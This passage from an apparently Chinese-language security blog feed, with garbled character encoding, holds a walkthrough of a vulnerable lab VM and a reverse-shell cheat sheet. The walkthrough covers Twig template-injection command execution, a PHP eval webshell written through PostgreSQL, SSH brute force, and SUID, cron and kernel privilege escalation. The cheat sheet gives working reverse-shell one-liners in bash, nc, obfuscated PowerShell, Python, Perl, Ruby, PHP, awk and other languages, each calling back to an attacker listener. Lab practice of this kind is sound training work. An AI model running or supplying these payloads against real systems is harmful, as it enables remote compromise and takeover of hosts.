å¹³å°ï¼Œé‚£ä¹ˆé»˜è®¤è´¦å·å¯†ç <code>admin</code>,<code>password</code>ï¼Œå¯¹äºDVWAï¼Œç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†<br>ä½†è¿™æ ·å°±æ²¡æ„æ€äº†ï¼Œè€Œå¦ä¸€ä¸ªXVWAæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç©ï¼Œæˆ‘å†³å®šè®©å®ƒå˜å¾—æ›´æœ‰æ„æ€ä¸€äº›ï¼ŒJustForFun</p><p>æ¯”å¦‚è¯´æ¨¡æ¿æ³¨å…¥<br><img src="SSTI.PNG" alt="SSTI"></p><p>å¯¹äºTWIGçš„æ¨¡æ¿æ³¨å…¥ï¼Œä½¿ç”¨ä»¥ä¸‹payloadå¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"whoami"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello www-data</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯ä»¥ç›´æ¥æ‹¿åˆ°shelläº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.135/6666 0&gt;&amp;1"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å°è¯•äº†å‡ ç§æ–¹æ³•éƒ½ä¼šæŠ¥å­—ç¬¦é”™è¯¯<br>æ¢ä¸€ç§æ€è·¯<br><img src="httpserver.PNG" alt="httpserver"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"wget http://192.168.220.135/a,py /tmp/"</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"python /tmp/a.py"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="www-data.PNG" alt="www-data"></p><h1 id="Drupalgeddon2ä¸€é”®GetShell"><a href="#Drupalgeddon2ä¸€é”®GetShell" class="headerlink" title="Drupalgeddon2ä¸€é”®GetShell"></a>Drupalgeddon2ä¸€é”®GetShell</h1><p>æ²¡é”™ï¼Œæ˜¯ä¹‹å‰é‡åˆ°è¿‡çš„drupalgeddon2</p><p><img src="drupal.PNG" alt="drupal"></p><h1 id="Lotus-RCE"><a href="#Lotus-RCE" class="headerlink" title="Lotus RCE"></a>Lotus RCE</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/lcms_php_exec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.220.134</span><br><span class="line"><span class="built_in">set</span> uri /cms/</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„uriæ ¼å¼ï¼Œæˆ‘åœ¨è¿™é‡Œè¢«å‘äº†o_o â€¦.</p></blockquote><p><img src="lotus.PNG" alt="lotus"></p><h1 id="SSHå¼±å¯†ç "><a href="#SSHå¼±å¯†ç " class="headerlink" title="SSHå¼±å¯†ç "></a>SSHå¼±å¯†ç </h1><ul><li>é’ˆå¯¹OpenSSH 6.6.1ç”¨æˆ·æšä¸¾æ¼æ´</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line"><span class="built_in">set</span> threads 20</span><br><span class="line"><span class="built_in">set</span> user_file /home/user/users.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºä¸€ä¸ªadminï¼Œç›®å‰ä¸ºæ­¢å…±çš„ä¸‰ä¸ªç”¨æˆ·å<code>admin</code>,<code>typhoon</code>,<code>root</code>,å†™å…¥<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l /home/user/user.txt -P /home/user/pass.txt ssh://192.168.201.6</span><br></pre></td></tr></table></figure><ul><li>admin:metallica</li><li>typhoon:789456123</li></ul><h1 id="PostgreSQLä»»æ„æ–‡ä»¶è¯»å–ä¸å†™å…¥"><a href="#PostgreSQLä»»æ„æ–‡ä»¶è¯»å–ä¸å†™å…¥" class="headerlink" title="PostgreSQLä»»æ„æ–‡ä»¶è¯»å–ä¸å†™å…¥"></a>PostgreSQLä»»æ„æ–‡ä»¶è¯»å–ä¸å†™å…¥</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>æšä¸¾å‡ºå¼±å¯†ç </p><blockquote><p>postgres:postgres</p></blockquote><p><img src="psql.PNG" alt="psql"></p><p>æ•°æ®åº“æ˜¯ç©ºçš„â€¦</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY test FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><p>é€šè¿‡COPYè¯»å–æ–‡ä»¶</p><p><img src="passwd.PNG" alt="passwd"></p><blockquote><p>postfixuser</p></blockquote><p>å†™å…¥webshell</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">test</span>(t) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php @eval($_GET[cmd]);?&gt;'</span>);</span><br><span class="line">COPY test(t) TO '/var/www/html/cmd.php';</span><br></pre></td></tr></table></figure><p>ç„¶è€Œè¿ä¸ä¸Šï¼Œè¿”å›ç©ºæ•°æ®ï¼Œå°è¯•åå¼¹ï¼Œæœ‰å¼•å·æŠ¥é”™â€¦è¯­æ³•ä¸ç†Ÿæ‚‰ï¼Œæ¯•ç«Ÿæ˜¯å³ä½¿å­¦çš„â€¦<br>æ‹¿å‡ºnavicatå†™ï¼Œ( â€¢Ì€ Ï‰ â€¢Ì )y</p><p><img src="postgresql-shell.PNG" alt="postgresql-shell"></p><p>å…¶å®è¿™é‡Œè¿˜å¯ä»¥åˆ©ç”¨UDFææƒï¼Œä¸è¿‡å¯¹åº”ç‰ˆæœ¬çš„<code>.so</code>æˆ‘æ²¡æœ‰æ‰¾åˆ°â€¦è‡ªå·±æ­å»ºçš„è¯æ¯”è¾ƒéº»çƒ¦ï¼Œå°±å…ˆæ”¾ä¸‹äº†</p><h1 id="Redisæœªæˆæƒè®¿é—®"><a href="#Redisæœªæˆæƒè®¿é—®" class="headerlink" title="Redisæœªæˆæƒè®¿é—®"></a>Redisæœªæˆæƒè®¿é—®</h1><p><img src="redis.PNG" alt="redis"></p><p>ä¸MongoDbä¸€æ ·çš„åˆ©ç”¨é“¾ï¼Œä¸€æ ·çš„å‘</p><h1 id="CUPSè¿œç¨‹æ‰“å°æœåŠ¡GetShell-amp-ææƒ"><a href="#CUPSè¿œç¨‹æ‰“å°æœåŠ¡GetShell-amp-ææƒ" class="headerlink" title="CUPSè¿œç¨‹æ‰“å°æœåŠ¡GetShell&amp;ææƒ"></a>CUPSè¿œç¨‹æ‰“å°æœåŠ¡GetShell&amp;ææƒ</h1><p>ä½œè€…è®¾è®¡é¢„æœŸåº”è¯¥æ˜¯æœ‰631çš„cupsè¿™ä¸€æ“ä½œ<br>ä½†æˆ‘æ­»æ´»å¤ç°ä¸å‡ºæ¥â€¦..tcl</p><blockquote><p><a href="https://www.exploit-db.com/exploits/37336" target="_blank" rel="noopener">CVE-2015-1158</a></p></blockquote><p><img src="cups.PNG" alt="cups"></p><h1 id="Tomcatåå°æ–‡ä»¶ä¸Šä¼ "><a href="#Tomcatåå°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="Tomcatåå°æ–‡ä»¶ä¸Šä¼ "></a>Tomcatåå°æ–‡ä»¶ä¸Šä¼ </h1><p>tomcaté»˜è®¤å¯†ç </p><p><img src="tomcat.PNG" alt=""></p><p>å°†jspåå¼¹é©¬(<code>reverse.jsp</code>)æ‰“åŒ…æˆzipï¼Œæ”¹åç¼€ä¸ºwarï¼Œä¸Šä¼ <br>è®¿é—®<code>http://192.168.201.6:8080/reverse/reverse.jsp</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat7@typhoon:/var/lib/tomcat7$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat7</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°tomcat7æƒé™çš„shell<br>ä¹Ÿå¯ä»¥ä½¿ç”¨msfçš„<code>exploit/mutli/http/tomcat/tomcat_mgr_upload</code></p><h1 id="Struts2å¤šå¤„æ¼æ´"><a href="#Struts2å¤šå¤„æ¼æ´" class="headerlink" title="Struts2å¤šå¤„æ¼æ´"></a>Struts2å¤šå¤„æ¼æ´</h1><p><img src="struts2.PNG" alt=""><br>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªstruts2-showcaseï¼Œæ‹¿å‡ºçš„struts-scanæ‰«ä¸€æ³¢ï¼Œåˆšå¥½ä½“éªŒä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python struts-scan.py http://192.168.201.6:8080/struts2-showcase/showcase.action</span><br></pre></td></tr></table></figure><p><img src="struts2-rs.PNG" alt=""></p><p>ç„¶è€Œåˆ©ç”¨æœ‰é—®é¢˜â€¦è¦æ˜¯æœ‰æ—¶é—´çš„è¯ï¼Œç®—äº†ï¼Œä¸ç«‹flagäº†<br>ç¿»ç®±å€’æŸœæ‰¾åˆ°å¤šä¸ªexpï¼Œä½“éªŒéƒ½æå·®â€¦..æœ€åæœ‰ä¸€å‘è¿˜è¡Œï¼Œå“ï¼Œè¿˜æ˜¯å¾—è‡ªå·±ä¸Šæ‰‹æ‰èƒ½ä¸°è¡£è¶³é£Ÿï¼Œäº‹åå†æä¸€æ³¢å§</p><p><img src="s2045.PNG" alt=""></p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="ææƒæ–¹æ³•ä¸€ï¼šSUIDææƒ"><a href="#ææƒæ–¹æ³•ä¸€ï¼šSUIDææƒ" class="headerlink" title="ææƒæ–¹æ³•ä¸€ï¼šSUIDææƒ"></a>ææƒæ–¹æ³•ä¸€ï¼šSUIDææƒ</h2><p>ç»å…¸çš„SUIDææƒ<br>æšä¸¾Sæƒé™ç¨‹åº:<code>find / -perm -4000 2&gt;/dev/null</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸‰ä¸ªå¯ç–‘ç¨‹åº</span></span><br><span class="line">/usr/bin/head</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/vim.basic</span><br></pre></td></tr></table></figure><p><strong>head</strong></p><p>ç›´æ¥<code>head /etc/shadow</code>æˆåŠŸæ‹¿åˆ°æ‰€æœ‰è´¦æˆ·å¯†ç </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:<span class="variable">$6</span><span class="variable">$xlUx2G5p</span>$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7:::</span><br></pre></td></tr></table></figure><p><strong>vim</strong></p><p>è¿™ä¸ªvimæœ‰ç‚¹å¥‡æ€ªï¼Œç›´æ¥<code>!/bin/bash</code>æˆ–<code>vim -c &#39;:!/bin/sh&#39;</code>å¾—åˆ°å¾—ä¾ç„¶æ˜¯åŸæƒé™å¾—shellâ€¦<br>ä½†é€šè¿‡vimå¾—shellå†ä½¿ç”¨pyçš„osåº“æ‰§è¡Œå¯ä»¥å¾—åˆ°root</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -c <span class="string">':python import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure><p><img src="vim-root.PNG" alt="vim-root.PNG"></p><p><strong>at</strong></p><p>è¿™ä¸ªatå‘½ä»¤è·Ÿvimä¸€æ ·çš„å‘</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at -t <span class="variable">$now</span> `/bin/bash -i &gt;&amp; /dev/tcp/192.168.201.7/6666 0&gt;&amp;1`</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ˜¯åŸshellï¼Œä½†è¿™æ¬¡pyä¹Ÿæ•‘ä¸äº†äº†â€¦åˆ©ç”¨å¤±è´¥</p><h2 id="ææƒæ–¹æ³•äºŒï¼šCrontabææƒ"><a href="#ææƒæ–¹æ³•äºŒï¼šCrontabææƒ" class="headerlink" title="ææƒæ–¹æ³•äºŒï¼šCrontabææƒ"></a>ææƒæ–¹æ³•äºŒï¼šCrontabææƒ</h2><p>åˆ©ç”¨ç‰¹æƒçš„headè¯»å–crontabä»»åŠ¡</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">head /var/spool/cron/crontabs/root -n 50</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*/1 * * * * /tab/script.sh</span><br></pre></td></tr></table></figure><p>åˆ°tabä¸‹çœ‹ä¸€ä¸‹ï¼Œæƒé™æ˜¯777</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 86 Apr 19 20:16 script.sh</span><br><span class="line">typhoon@typhoon:/tab$ cat script.sh </span><br><span class="line">echo &quot;Typhoon is UP!&quot;</span><br><span class="line"></span><br><span class="line">#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt;</span><br></pre></td></tr></table></figure><p>å†™å…¥åå¼¹shellå‘½ä»¤åˆ°<code>script.sh</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1&quot; &gt; script.sh</span><br></pre></td></tr></table></figure><p>æœªçŸ¥åŸå› åå¼¹æ²¡ç”Ÿæ•ˆï¼Œè€Œncæ˜¯æ²¡æœ‰<code>-e</code>å‚æ•°çš„é‚£ç§</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ <span class="built_in">echo</span> <span class="string">"mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.5 6666 &gt;/tmp/test"</span> &gt; script.sh</span><br></pre></td></tr></table></figure><p><img src="root-flag.PNG" alt="root-flag"></p><h2 id="ææƒæ–¹æ³•ä¸‰ï¼šå†…æ ¸ææƒ"><a href="#ææƒæ–¹æ³•ä¸‰ï¼šå†…æ ¸ææƒ" class="headerlink" title="ææƒæ–¹æ³•ä¸‰ï¼šå†…æ ¸ææƒ"></a>ææƒæ–¹æ³•ä¸‰ï¼šå†…æ ¸ææƒ</h2><p>å†…æ ¸æå–æœ€æ–¹ä¾¿ã€å¿«æ·ï¼Œä½†æ˜¯æœ‰å±€é™æ€§,<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">exp</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$python</span> -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tmp$ wget 192.168.200.6:8000/37292.c</span><br><span class="line">typhoon@typhoon:/tmp$ gcc 37292.c -o hac</span><br><span class="line">typhoon@typhoon:/tmp$ chmod +x hack</span><br><span class="line">typhoon@typhoon:/tmp$ ./hack</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>æœ€åæ¥è¯•ä¸€ä¸‹å†…æ ¸è‡ªåŠ¨åŒ–ææƒè„šæœ¬</p><p><img src="autoroot.PNG" alt="autoroot"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ç›®æ ‡ï¼šroot&lt;/li&gt;
&lt;li&gt;ä½œè€…ï¼šPrismaCSI&lt;/li&gt;
&lt;li&gt;éš¾åº¦å®šä½ï¼šæ— &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;æ¸—é€è¿‡ç¨‹ä¸­ç»å†äº†å¥½å‡ æ¬¡æ¢ç¯å¢ƒï¼ŒIPåœ°å€æœ‰ç‚¹æ··ä¹±ï¼Œè¯·ä½“è°…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;MongoDBæœªæˆæƒè®¿é—®&quot;&gt;&lt;a href=&quot;#MongoDBæœªæˆæƒè®¿é—®&quot; class=&quot;headerlink&quot; title=&quot;MongoDBæœªæˆæƒè®¿é—®&quot;&gt;&lt;/a&gt;MongoDBæœªæˆæƒè®¿é—®&lt;/h1&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux&amp;WinèŠ±å¼å¼¹shellæŒ‡å—</title>
    <link href="https://t43wiu6.github.io/2019/03/26/reverse-shell/"/>
    <id>https://t43wiu6.github.io/2019/03/26/reverse-shell/</id>
    <published>2019-03-26T23:58:40.000Z</published>
    <updated>2019-04-13T08:04:20.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.220.140 6666</span><br></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -ep bypass -Command <span class="string">"<span class="variable">$RcvLFCUFMmdDX</span>='192.168.220.140';<span class="variable">$eGdTwRr</span>=6666;<span class="variable">$aPjzrf</span>=New-Object System.Net.Sockets.TCPClient(<span class="variable">$RcvLFCUFMmdDX</span>,<span class="variable">$eGdTwRr</span>);<span class="variable">$ADWDNku</span>=<span class="variable">$aPjzrf</span>.GetStream();[byte[]]<span class="variable">$mvkwuYHrYO</span>=0..65535|%&#123;0&#125;;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);while((<span class="variable">$KCaBvR</span>=<span class="variable">$ADWDNku</span>.Read(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$mvkwuYHrYO</span>.Length)) -ne 0)&#123;<span class="variable">$anSGyc</span>=([text.encoding]::ASCII).GetString(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$KCaBvR</span>);try&#123;<span class="variable">$gRrnhEIMpeoP</span>=(Invoke-Expression -c <span class="variable">$anSGyc</span> 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error <span class="variable">$_</span>;&#125;;<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$gRrnhEIMpeoP</span>+'PS '+(Get-Location).Path+'&gt; ';<span class="variable">$RcvLFCUFMmdDX1</span>=(<span class="variable">$RcvLFCUFMmdDX2</span>[0]|Out-String);<span class="variable">$RcvLFCUFMmdDX2</span>.clear();<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$RcvLFCUFMmdDX0</span>+<span class="variable">$RcvLFCUFMmdDX1</span>;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes(<span class="variable">$RcvLFCUFMmdDX0</span>);<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);<span class="variable">$ADWDNku</span>.Flush();&#125;;<span class="variable">$aPjzrf</span>.Close();if(<span class="variable">$RcvLFCUFMmdDX3</span>)&#123;<span class="variable">$RcvLFCUFMmdDX3</span>.Stop();&#125;;"</span></span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote><p><strong>TCP</strong></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();"</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>UDP</strong><br>ps:<code>nc -luvvp 6666</code></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();"</span></span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line">nc -lvvp 6666 <span class="comment">#å‘½ä»¤ä¼ è¾“çª—å£</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#å‘½ä»¤ç»“æœæ˜¾ç¤ºçª—å£</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mkfifo /tmp/<span class="built_in">test</span>;cat /tmp/<span class="built_in">test</span>|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mknod /tmp/<span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/<span class="built_in">test</span>|/bin/bash 1&gt;/tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p=6666;awk -v port=<span class="string">"<span class="variable">$p</span>"</span> <span class="string">'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;'</span> /dev/null</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.220.131'</span>, <span class="number">6666</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">      <span class="number">0</span> =&gt; $sock,</span><br><span class="line">      <span class="number">1</span> =&gt; $sock,</span><br><span class="line">      <span class="number">2</span> =&gt; $sock</span><br><span class="line"> );</span><br><span class="line"> $process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line"> proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">"exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end"</span></span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><blockquote><p><strong>TCP</strong></p></blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MSocket -e <span class="string">"\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;"</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">"exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;"</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>UDP</strong><br>ps:<code>nc -luvvp</code></p></blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">'$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure><h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i 